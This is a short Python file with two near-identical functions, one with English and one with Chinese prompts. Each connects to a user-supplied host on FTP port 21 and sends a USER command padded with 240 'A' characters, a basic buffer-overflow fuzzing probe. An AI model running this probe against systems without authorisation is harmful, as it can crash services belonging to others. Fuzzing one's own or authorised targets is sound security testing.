def fuzzing2_e():
    print ("Please enter target host!")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        import socket
        FUZZ = "A" * 240
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host,21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + b"\r\n")
        s.close()
    else:
        print ("Error!")
def fuzzing2_c():
    print ("请输入目标主机IP!")
    hostin = input()
    host = str(hostin)
    if len(host) > 0:
        import socket
        FUZZ = "A" * 240
        print("Fuzzing with {} bytes".format(len(FUZZ)))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect((host,21))
        s.recv(1024)
        s.send(b"USER " + FUZZ.encode() + b"\r\n")
        s.close()
    else:
        print("错误!")